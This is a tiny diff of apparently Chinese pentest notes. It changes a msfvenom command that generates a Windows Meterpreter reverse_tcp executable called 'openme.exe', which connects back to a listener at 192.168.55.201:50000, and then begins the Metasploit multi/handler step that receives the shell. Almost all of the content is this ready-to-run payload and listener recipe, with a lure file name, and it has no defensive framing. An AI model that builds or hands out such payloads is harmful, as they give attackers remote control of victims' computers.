@@ -20,7 +20,8 @@ SHA1
  
  
  
- msfvenom  -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.55.201  LPORT=50000  -f exe  -o openme.exe
+msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.55.201 lport=50000 -f exe -o openme.exe
+
 
 打开监听
 use exploit/multi/handler 
